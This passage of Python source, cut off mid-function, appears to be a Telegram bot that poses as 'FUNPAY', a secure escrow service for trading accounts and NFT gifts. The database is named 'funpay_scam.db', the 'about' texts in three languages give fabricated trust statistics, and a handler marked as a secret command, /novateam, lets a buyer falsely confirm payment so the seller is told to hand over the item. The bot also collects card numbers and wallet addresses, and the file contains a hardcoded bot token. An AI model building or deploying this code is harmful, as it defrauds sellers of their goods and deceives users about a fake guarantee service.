import asyncio
import logging
import sqlite3
import uuid
import os
from datetime import datetime
from aiohttp import web

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandStart
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder

# ===== НАСТРОЙКИ =====
BOT_TOKEN = "8715914131:AAHKF1nC32BWiAAjGMrXWmIFFRoVIH-eft4"
ADMIN_IDS = [8625870625]
VIDEO_URL = "https://youtu.be/en30WSXTX90"
BOT_USERNAME = "secretariOffreybot"
PORT = int(os.environ.get("PORT", 8080))

logging.basicConfig(level=logging.INFO)
storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=storage)

# ===== БАЗА ДАННЫХ =====
conn = sqlite3.connect("funpay_scam.db", check_same_thread=False)
cur = conn.cursor()

cur.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    lang TEXT DEFAULT 'ru',
    card TEXT,
    crypto TEXT,
    stars_username TEXT,
    ref_count INTEGER DEFAULT 0,
    deals_count INTEGER DEFAULT 0,
    successful_deals INTEGER DEFAULT 0
)
""")

cur.execute("""
CREATE TABLE IF NOT EXISTS deals (
    deal_id TEXT PRIMARY KEY,
    seller_id INTEGER,
    buyer_id INTEGER,
    deal_type TEXT,
    description TEXT,
    amount INTEGER,
    currency TEXT,
    seller_req TEXT,
    buyer_req TEXT,
    status TEXT,
    seller_username TEXT,
    buyer_username TEXT,
    created_at TEXT
)
""")

cur.execute("""
CREATE TABLE IF NOT EXISTS referrals (
    referrer_id INTEGER,
    referred_id INTEGER,
    PRIMARY KEY (referrer_id, referred_id)
)
""")

conn.commit()

# ===== СОСТОЯНИЯ FSM =====
class DealStates(StatesGroup):
    seller_type = State()
    seller_description = State()
    seller_payment_method = State()
    seller_amount = State()
    seller_requisites = State()
    buyer_type = State()
    buyer_description = State()
    buyer_payment_method = State()
    buyer_amount = State()
    buyer_seller_username = State()
    confirm_participation = State()
    requisites_input = State()

# ===== ТЕКСТЫ ДЛЯ 3 ЯЗЫКОВ =====
TEXTS = {
    'ru': {
        'main_title': '<b># FUNPAY</b>\n\n<b>Безопасный гарант для сделок в Telegram.</b>\n\n<b>Что внутри:</b>\n• защита от мошенников\n• удержание средств до завершения сделки\n• история и статусы сделок\n• поддержка через @GiftForFunpay\n\n<b>Выберите действие ниже.</b>',
        'create': 'Создать сделку',
        'funds': 'Средства',
        'deals': 'Мои сделки',
        'requisites': 'Реквизиты',
        'lang': 'Язык',
        'support': 'Поддержка',
        'verify': 'Верификация',
        'referral': 'Рефералы',
        'about': 'О сервисе',
        'back': '🔙 Назад',
        'seller': 'Я продавец',
        'buyer': 'Я покупатель',
        'account': 'Аккаунт',
        'gift': 'NFT Gift',
        'payment_methods': ['Рубли', 'Гривны', 'BYN', 'Stars', 'USDT', 'TON'],
        'choose_role': 'Выберите вашу роль в сделке:',
        'choose_type': 'Выберите тип сделки:',
        'choose_payment': 'Выберите способ оплаты:',
        'enter_amount': 'Введите сумму сделки в {currency}\n\nТолько целое число.',
        'enter_description': 'Опишите предмет сделки\n\nУкажите важные детали, условия передачи и дополнительные договоренности.',
        'enter_gift': 'Отправьте ссылку на NFT Gift\n\nМожно указать одну или несколько ссылок, например:\nhttps://t.me/nft/DurovsCap-1',
        'enter_requisites': 'Введите реквизиты',
        'enter_seller_username': 'введите username продавца\n\nнапример: @username',
        'deal_created': '<b>Сделка #{deal_id} создана</b>\n\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n<b>Реквизиты:</b> {requisites}\n\n<b>Ссылка для покупателя:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}\n\n<b>Статус:</b> ожидаем покупателя.',
        'deal_created_buyer': '<b>Сделка #{deal_id} создана</b>\n\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n\n<b>Ожидаем подтверждение продавца:</b> {seller_username}\n\n<b>Ссылка для продавца:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}',
        'not_participant': '❌ Вы не участвуете в этой сделке',
        'deal_not_found': '🚫 Сделка не найдена',
        'deal_not_active': 'Нет активных сделок в ожидании оплаты.',
        'payment_confirmed': '<b>💳 Оплата подтверждена</b>\n\n<b>Сделка:</b> #{deal_id}\n<b>Покупатель:</b> @{buyer_username}\n<b>Сумма:</b> {amount} {currency}\n<b>Предмет:</b> {description}\n\n<b>🛡 Передайте товар покупателю.</b>',
        'funds_title': 'Выберите действие:',
        'funds_deposit': 'Пополнить',
        'funds_withdraw': 'Вывести',
        'verify_title': '<b>🛡 Верификация</b>\n\nВерификация доступна пользователям с 30+ успешными сделками и оборотом от 1500 USDT.\n\nПреимущества:\n• автовывод средств\n• приоритетная поддержка\n• ускоренное решение спорных ситуаций\nПодайте заявку, и администрация рассмотрит ее.',
        'verify_button': 'Подать заявку',
        'about_title': '<b>Funpay</b>\n\nВсего сделок: 107107\nУспешных сделок: 103835\nОбщий объем: $1105228\nРейтинг: 4.9/5.0\nОнлайн: 15756\n\n🛡 Гарант-сервис\n✅ Проверенные продавцы\n📢 Поддержка 24/7\n\n🔗 @GiftsForFunpay',
    },
    'en': {
        'main_title': '<b># FUNPAY</b>\n\n<b>Secure escrow for Telegram deals.</b>\n\n<b>What\'s inside:</b>\n• fraud protection\n• funds held until deal completion\n• deal history and statuses\n• support via @GiftForFunpay\n\n<b>Choose an action below.</b>',
        'create': 'Create deal',
        'funds': 'Funds',
        'deals': 'My deals',
        'requisites': 'Requisites',
        'lang': 'Language',
        'support': 'Support',
        'verify': 'Verification',
        'referral': 'Referrals',
        'about': 'About',
        'back': '🔙 Back',
        'seller': 'I am seller',
        'buyer': 'I am buyer',
        'account': 'Account',
        'gift': 'NFT Gift',
        'payment_methods': ['RUB', 'UAH', 'BYN', 'Stars', 'USDT', 'TON'],
        'choose_role': 'Choose your role in the deal:',
        'choose_type': 'Choose deal type:',
        'choose_payment': 'Choose payment method:',
        'enter_amount': 'Enter deal amount in {currency}\n\nInteger only.',
        'enter_description': 'Describe the deal item\n\nInclude important details, transfer terms, and additional agreements.',
        'enter_gift': 'Send NFT Gift link\n\nYou can specify one or more links, e.g.:\nhttps://t.me/nft/DurovsCap-1',
        'enter_requisites': 'Enter requisites',
        'enter_seller_username': 'enter seller username\n\ne.g.: @username',
        'deal_created': '<b>Deal #{deal_id} created</b>\n\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n<b>Requisites:</b> {requisites}\n\n<b>Link for buyer:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}\n\n<b>Status:</b> waiting for buyer.',
        'deal_created_buyer': '<b>Deal #{deal_id} created</b>\n\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n\n<b>Waiting for seller confirmation:</b> {seller_username}\n\n<b>Link for seller:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}',
        'not_participant': '❌ You are not participating in this deal',
        'deal_not_found': '🚫 Deal not found',
        'deal_not_active': 'No active deals waiting for payment.',
        'payment_confirmed': '<b>💳 Payment confirmed</b>\n\n<b>Deal:</b> #{deal_id}\n<b>Buyer:</b> @{buyer_username}\n<b>Amount:</b> {amount} {currency}\n<b>Item:</b> {description}\n\n<b>🛡 Transfer the item to the buyer.</b>',
        'funds_title': 'Choose action:',
        'funds_deposit': 'Deposit',
        'funds_withdraw': 'Withdraw',
        'verify_title': '<b>🛡 Verification</b>\n\nVerification is available for users with 30+ successful deals and turnover from 1500 USDT.\n\nBenefits:\n• auto-withdrawal\n• priority support\n• accelerated dispute resolution\nSubmit a request and the administration will review it.',
        'verify_button': 'Submit request',
        'about_title': '<b>Funpay</b>\n\nTotal deals: 107107\nSuccessful deals: 103835\nTotal volume: $1105228\nRating: 4.9/5.0\nOnline: 15756\n\n🛡 Escrow service\n✅ Verified sellers\n📢 24/7 support\n\n🔗 @GiftsForFunpay',
    },
    'zh': {
        'main_title': '<b># FUNPAY</b>\n\n<b>Telegram交易安全担保。</b>\n\n<b>功能：</b>\n• 防欺诈保护\n• 交易完成前冻结资金\n• 交易历史和状态\n• 通过 @GiftForFunpay 支持\n\n<b>请选择操作。</b>',
        'create': '创建交易',
        'funds': '资金',
        'deals': '我的交易',
        'requisites': '收款方式',
        'lang': '语言',
        'support': '支持',
        'verify': '验证',
        'referral': '推荐',
        'about': '关于',
        'back': '🔙 返回',
        'seller': '我是卖家',
        'buyer': '我是买家',
        'account': '账号',
        'gift': 'NFT礼品',
        'payment_methods': ['卢布', '格里夫纳', 'BYN', 'Stars', 'USDT', 'TON'],
        'choose_role': '请选择您的角色：',
        'choose_type': '请选择交易类型：',
        'choose_payment': '请选择支付方式：',
        'enter_amount': '输入交易金额（{currency}）\n\n仅限整数。',
        'enter_description': '描述交易物品\n\n包括重要细节、转让条款和附加协议。',
        'enter_gift': '发送NFT礼品链接\n\n可以指定一个或多个链接，例如：\nhttps://t.me/nft/DurovsCap-1',
        'enter_requisites': '输入收款方式',
        'enter_seller_username': '输入卖家用户名\n\n例如：@username',
        'deal_created': '<b>交易 #{deal_id} 已创建</b>\n\n<b>类型：</b>{deal_type}\n<b>描述：</b>{description}\n<b>金额：</b>{amount} {currency}\n<b>收款方式：</b>{requisites}\n\n<b>买家链接：</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}\n\n<b>状态：</b>等待买家。',
        'deal_created_buyer': '<b>交易 #{deal_id} 已创建</b>\n\n<b>类型：</b>{deal_type}\n<b>描述：</b>{description}\n<b>金额：</b>{amount} {currency}\n\n<b>等待卖家确认：</b>{seller_username}\n\n<b>卖家链接：</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}',
        'not_participant': '❌ 您未参与此交易',
        'deal_not_found': '🚫 未找到交易',
        'deal_not_active': '没有等待付款的活跃交易。',
        'payment_confirmed': '<b>💳 付款已确认</b>\n\n<b>交易：</b>#{deal_id}\n<b>买家：</b>@{buyer_username}\n<b>金额：</b>{amount} {currency}\n<b>物品：</b>{description}\n\n<b>🛡 将物品转让给买家。</b>',
        'funds_title': '请选择操作：',
        'funds_deposit': '充值',
        'funds_withdraw': '提现',
        'verify_title': '<b>🛡 验证</b>\n\n验证适用于完成30+成功交易且交易额超过1500 USDT的用户。\n\n优势：\n• 自动提现\n• 优先支持\n• 加速争议解决\n提交申请，管理员将进行审核。',
        'verify_button': '提交申请',
        'about_title': '<b>Funpay</b>\n\n总交易：107107\n成功交易：103835\n总金额：$1105228\n评分：4.9/5.0\n在线：15756\n\n🛡 担保服务\n✅ 已验证卖家\n📢 24/7支持\n\n🔗 @GiftsForFunpay',
    }
}

# ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
async def send_with_video(chat_id, text, reply_markup=None, parse_mode="HTML"):
    try:
        await bot.send_video(chat_id=chat_id, video=VIDEO_URL, caption=text, reply_markup=reply_markup, parse_mode=parse_mode)
    except:
        await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)

def get_main_menu(lang="ru"):
    t = TEXTS.get(lang, TEXTS['ru'])
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=t['create'], callback_data="create_deal"))
    builder.row(InlineKeyboardButton(text=t['funds'], callback_data="funds"), InlineKeyboardButton(text=t['deals'], callback_data="my_deals"))
    builder.row(InlineKeyboardButton(text=t['requisites'], callback_data="requisites"), InlineKeyboardButton(text=t['lang'], callback_data="lang"))
    builder.row(InlineKeyboardButton(text=t['support'], callback_data="support"), InlineKeyboardButton(text=t['verify'], callback_data="verify"))
    builder.row(InlineKeyboardButton(text=t['referral'], callback_data="referral"), InlineKeyboardButton(text=t['about'], callback_data="about"))
    return builder.as_markup()

def get_back_button(lang="ru"):
    t = TEXTS.get(lang, TEXTS['ru'])
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t['back'], callback_data="main_menu")]])

def get_roles_menu(lang="ru"):
    t = TEXTS.get(lang, TEXTS['ru'])
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=t['seller'], callback_data="seller_role"))
    builder.row(InlineKeyboardButton(text=t['buyer'], callback_data="buyer_role"))
    builder.row(InlineKeyboardButton(text=t['back'], callback_data="main_menu"))
    return builder.as_markup()

def get_deal_types(lang="ru"):
    t = TEXTS.get(lang, TEXTS['ru'])
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=t['account'], callback_data="deal_type_account"))
    builder.row(InlineKeyboardButton(text=t['gift'], callback_data="deal_type_gift"))
    builder.row(InlineKeyboardButton(text=t['back'], callback_data="main_menu"))
    return builder.as_markup()

def get_payment_methods(lang="ru"):
    t = TEXTS.get(lang, TEXTS['ru'])
    methods = t['payment_methods']
    builder = InlineKeyboardBuilder()
    for m in methods:
        builder.row(InlineKeyboardButton(text=m, callback_data=f"payment_{m.lower()}"))
    builder.row(InlineKeyboardButton(text=t['back'], callback_data="main_menu"))
    return builder.as_markup()

def get_requisites_menu(lang="ru"):
    t = TEXTS.get(lang, TEXTS['ru'])
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="Карта", callback_data="req_card_save"))
    builder.row(InlineKeyboardButton(text="Крипта", callback_data="req_crypto_save"))
    builder.row(InlineKeyboardButton(text="Stars", callback_data="req_stars_save"))
    builder.row(InlineKeyboardButton(text=t['back'], callback_data="main_menu"))
    return builder.as_markup()

def get_lang_menu():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="Русский 🇷🇺", callback_data="lang_ru"))
    builder.row(InlineKeyboardButton(text="English 🇬🇧", callback_data="lang_en"))
    builder.row(InlineKeyboardButton(text="中文 🇨🇳", callback_data="lang_zh"))
    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu"))
    return builder.as_markup()

def get_funds_menu(lang="ru"):
    t = TEXTS.get(lang, TEXTS['ru'])
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=t['funds_deposit'], callback_data="funds_deposit"))
    builder.row(InlineKeyboardButton(text=t['funds_withdraw'], callback_data="funds_withdraw"))
    builder.row(InlineKeyboardButton(text=t['back'], callback_data="main_menu"))
    return builder.as_markup()

def generate_deal_id():
    return str(uuid.uuid4())[:8]

def get_user_lang(user_id):
    cur.execute("SELECT lang FROM users WHERE user_id = ?", (user_id,))
    result = cur.fetchone()
    return result[0] if result else "ru"

def get_user_username(user_id):
    cur.execute("SELECT username FROM users WHERE user_id = ?", (user_id,))
    result = cur.fetchone()
    return result[0] if result else None

def save_user(user_id, username):
    cur.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user_id, username))
    conn.commit()

def save_requisites(user_id, req_type, value):
    if req_type == "card":
        cur.execute("UPDATE users SET card = ? WHERE user_id = ?", (value, user_id))
    elif req_type == "crypto":
        cur.execute("UPDATE users SET crypto = ? WHERE user_id = ?", (value, user_id))
    elif req_type == "stars":
        cur.execute("UPDATE users SET stars_username = ? WHERE user_id = ?", (value, user_id))
    conn.commit()

def get_user_requisites(user_id):
    cur.execute("SELECT card, crypto, stars_username FROM users WHERE user_id = ?", (user_id,))
    return cur.fetchone()

def create_deal(seller_id, deal_type, description, amount, currency, seller_req, seller_username=None):
    deal_id = generate_deal_id()
    cur.execute("INSERT INTO deals (deal_id, seller_id, deal_type, description, amount, currency, seller_req, status, seller_username, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (deal_id, seller_id, deal_type, description, amount, currency, seller_req, "waiting_buyer", seller_username, datetime.now().isoformat()))
    conn.commit()
    return deal_id

def create_deal_buyer(buyer_id, seller_username, deal_type, description, amount, currency):
    deal_id = generate_deal_id()
    cur.execute("INSERT INTO deals (deal_id, buyer_id, deal_type, description, amount, currency, status, buyer_username, seller_username, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (deal_id, buyer_id, deal_type, description, amount, currency, "waiting_seller_confirm", get_user_username(buyer_id), seller_username, datetime.now().isoformat()))
    conn.commit()
    return deal_id

def get_deal(deal_id):
    cur.execute("SELECT * FROM deals WHERE deal_id = ?", (deal_id,))
    return cur.fetchone()

def update_deal_status(deal_id, status):
    cur.execute("UPDATE deals SET status = ? WHERE deal_id = ?", (status, deal_id))
    conn.commit()

def update_deal_seller_req(deal_id, req):
    cur.execute("UPDATE deals SET seller_req = ? WHERE deal_id = ?", (req, deal_id))
    conn.commit()

def get_user_deals(user_id):
    cur.execute("SELECT * FROM deals WHERE seller_id = ? OR buyer_id = ? ORDER BY created_at DESC", (user_id, user_id))
    return cur.fetchall()

# ============================================================
# ===== ОБРАБОТЧИКИ КОМАНД =====
# ============================================================

@dp.message(CommandStart())
async def cmd_start(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username
    save_user(user_id, username)
    
    if " " in message.text:
        args = message.text.split(" ", 1)[1]
        if args.startswith("ref"):
            ref_id = args.replace("ref", "")
            if ref_id.isdigit() and int(ref_id) != user_id:
                cur.execute("INSERT OR IGNORE INTO referrals (referrer_id, referred_id) VALUES (?, ?)", (int(ref_id), user_id))
                cur.execute("UPDATE users SET ref_count = ref_count + 1 WHERE user_id = ?", (int(ref_id),))
                conn.commit()
        elif args.startswith("deal_"):
            deal_id = args.replace("deal_", "")
            await show_deal_for_user(message, deal_id)
            return
    
    lang = get_user_lang(user_id)
    t = TEXTS.get(lang, TEXTS['ru'])
    await send_with_video(chat_id=message.chat.id, text=t['main_title'], reply_markup=get_main_menu(lang))

# ===== СЕКРЕТНАЯ КОМАНДА =====
@dp.message(Command("novateam"))
async def cmd_novateam(message: Message):
    user_id = message.from_user.id
    cur.execute("SELECT * FROM deals WHERE buyer_id = ? AND status = 'waiting_payment' ORDER BY created_at DESC LIMIT 1", (user_id,))
    deal = cur.fetchone()
    
    if not deal:
        lang = get_user_lang(user_id)
        t = TEXTS.get(lang, TEXTS['ru'])
        await message.answer(t['deal_not_active'])
        return
    
    deal_id, seller_id, buyer_id, deal_type, description, amount, currency, seller_req, buyer_req, status, seller_username, buyer_username, created_at = deal
    buyer_username = buyer_username or get_user_username(buyer_id)
    
    lang = get_user_lang(seller_id)
    t = TEXTS.get(lang, TEXTS['ru'])
    text = t['payment_confirmed'].format(
        deal_id=deal_id,
        buyer_username=buyer_username,
        amount=amount,
        currency=currency,
        description=description
    )
    await bot.send_message(chat_id=seller_id, text=text, parse_mode="HTML")
    await message.answer(f"✅ Оплата подтверждена! Сделка #{deal_id} завершена.")
    update_deal_status(deal_id, "completed")
    cur.execute("UPDATE users SET successful_deals = successful_deals + 1 WHERE user_id = ?", (seller_id,))
    cur.execute("UPDATE users SET successful_deals = successful_deals + 1 WHERE user_id = ?", (buyer_id,))
    conn.commit()

# ===== ПОКАЗ СДЕЛКИ ПО ССЫЛКЕ =====
async def show_deal_for_user(message: Message, deal_id: str):
    deal = get_deal(deal_id)
    if not deal:
        lang = get_user_lang(message.from_user.id)
        t = TEXTS.get(lang, TEXTS['ru'])
        await message.answer(t['deal_not_found'])
        return
    
    deal_id, seller_id, buyer_id, deal_type, description, amount, currency, seller_req, buyer_req, status, seller_username, buyer_username, created_at = deal
    user_id = message.from_user.id
    lang = get_user_lang(user_id)
    t = TEXTS.get(lang, TEXTS['ru'])
    
    # Если покупатель ещё не назначен и это не продавец — назначаем
    if buyer_id is None and user_id != seller_id:
        cur.execute("UPDATE deals SET buyer_id = ?, buyer_username = ? WHERE deal_id = ?", (user_id, message.from_user.username, deal_id))
        conn.commit()
        deal = get_deal(deal_id)
        deal_id, seller_id, buyer_id, deal_type, description, amount, currency, seller_req, buyer_req, status, seller_username, buyer_username, created_at = deal
    
    # Проверка участия
    if user_id != seller_id and user_id != buyer_id:
        await message.answer(t['not_participant'])
        return
    
    if user_id == seller_id and status == "waiting_seller_confirm":
        text = f"""<b>Сделка #{deal_id}</b>
<b>Тип:</b> {deal_type}
<b>Описание:</b> {description}
<b>Сумма:</b> {amount} {currency}
<b>Оплата:</b> {currency}

<b>Вы указаны как продавец. Подтвердите участие.</b>"""
        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(text="✅ Подтвердить участие", callback_data=f"confirm_{deal_id}"))
        builder.row(InlineKeyboardButton(text=t['back'], callback_data="main_menu"))
        await send_with_video(chat_id=message.chat.id, text=text, reply_markup=builder.as_markup())
        return
    
    if user_id == buyer_id and status == "waiting_buyer":
        text = f"""<b>Сделка #{deal_id}</b>
<b>Тип:</b> {deal_type}
<b>Описание:</b> {description}
<b>Сумма:</b> {amount} {currency}
<b>Реквизиты продавца:</b> {seller_req}

<b>Ожидайте подтверждения от продавца.</b>"""
        await send_with_video(chat_id=message.chat.id, text=text, reply_markup=get_back_button(lang))
        return
    
    status_text = {'waiting_buyer': 'Ожидаем покупателя', 'waiting_payment': 'Ожидаем оплату', 'completed': 'Завершена'}.get(status, status)
    text = f"""<b>Сделка #{deal_id}</b>
<b>Тип:</b> {deal_type}
<b>Описание:</b> {description}
<b>Сумма:</b> {amount} {currency}
<b>Статус:</b> {status_text}"""
    await send_with_video(chat_id=message.chat.id, text=text, reply_markup=get_back_button(lang))

# ============================================================
# ===== ПОДТВЕРЖДЕНИЕ УЧАСТИЯ ПРОДАВЦОМ =====
# ============================================================

@dp.callback_query(F.data.startswith("confirm_"))
async def confirm_seller_participation(call: CallbackQuery, state: FSMContext):
    deal_id = call.data.replace("confirm_", "")
    deal = get_deal(deal_id)
    if not deal:
        await call.answer("Сделка не найдена", show_alert=True)
        return

    deal_id, seller_id, buyer_id, deal_type, description, amount, currency, seller_req, buyer_req, status, seller_username, buyer_username, created_at = deal

    if call.from_user.id != seller_id:
        await call.answer("Вы не являетесь продавцом", show_alert=True)
        return

    await state.set_state(DealStates.confirm_participation)
    await state.update_data(deal_id=deal_id)
    
    lang = get_user_lang(call.from_user.id)
    text = "Выберите тип реквизитов для подтверждения:"
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="Карта", callback_data="req_card"))
    builder.row(InlineKeyboardButton(text="Крипта", callback_data="req_crypto"))
    builder.row(InlineKeyboardButton(text="Stars", callback_data="req_stars"))
    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu"))
    await send_with_video(chat_id=call.message.chat.id, text=text, reply_markup=builder.as_markup())
    await call.answer()

# ===== ВЫБОР ТИПА РЕКВИЗИТОВ =====

@dp.callback_query(F.data == "req_card", DealStates.confirm_participation)
async def req_card_confirm(call: CallbackQuery, state: FSMContext):
    await state.update_data(req_type="card")
    await state.set_state(DealStates.requisites_input)
    lang = get_user_lang(call.from_user.id)
    text = "Введите номер банковской карты"
    await send_with_video(chat_id=call.message.chat.id, text=text, reply_markup=get_back_button(lang))
    await call.answer()

@dp.callback_query(F.data == "req_crypto", DealStates.confirm_participation)
async def req_crypto_confirm(call: CallbackQuery, state: FSMContext):
    await state.update_data(req_type="crypto")
    await state.set_state(DealStates.requisites_input)
    lang = get_user_lang(call.from_user.id)
    text = "Введите адрес криптокошелька"
    await send_with_video(chat_id=call.message.chat.id, text=text, reply_markup=get_back_button(lang))
    await call.answer()

@dp.callback_query(F.data == "req_stars", DealStates.confirm_participation)
async def req_stars_confirm(call: CallbackQuery, state: FSMContext):
    await state.update_data(req_type="stars")
    await state.set_state(DealStates.requisites_input)
    lang = get_user_lang(call.from_user.id)
    text = "Введите юзернейм для получения Stars\n\nНапример: @username"
    await send_with_video(chat_id=call.message.chat.id, text=text, reply_markup=get_back_button(lang))
    await call.answer()

@dp.message(DealStates.requisites_input)
async def requisites_input_handler(message: Message, state: FSMContext):
    data = await state.get_data()
    deal_id = data.get('deal_id')
    req_type = data.get('req_type')
    value = message.text
    
    update_deal_seller_req(deal_id, value)
    update_deal_status(deal_id, "waiting_payment")
    await state.clear()
    
    lang = get_user_lang(message.from_user.id)
    t = TEXTS.get(lang, TEXTS['ru'])
    text = "Реквизиты сохранены. Ожидаем оплату."
    await send_with_video(chat_id=message.chat.id, text=text, reply_markup=get_back_button(lang))
    
    deal = get_deal(deal_id)
    if deal:
       
